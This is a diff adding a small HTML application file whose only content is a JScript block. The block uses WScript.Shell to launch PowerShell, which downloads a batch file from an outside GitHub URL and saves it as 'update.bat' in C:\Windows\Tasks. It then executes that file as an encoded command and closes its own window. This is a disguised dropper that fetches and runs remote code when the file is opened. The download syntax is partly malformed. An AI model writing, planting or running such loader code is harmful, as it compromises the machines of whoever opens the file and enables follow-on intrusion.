@@ -1,0 +1,11 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run("powershell -uri https://raw.githubusercontent.com/p477d343/T5CAMP/main/test.bat -outfile C:\\Windows\\Tasks\\update.bat; powershell -encodedCommand (Get-Content 'C:\\Windows\\Tasks\\update.bat' -raw)");
+self.close();
+</script>
+</head>
+<body>
+</body>
+</html>
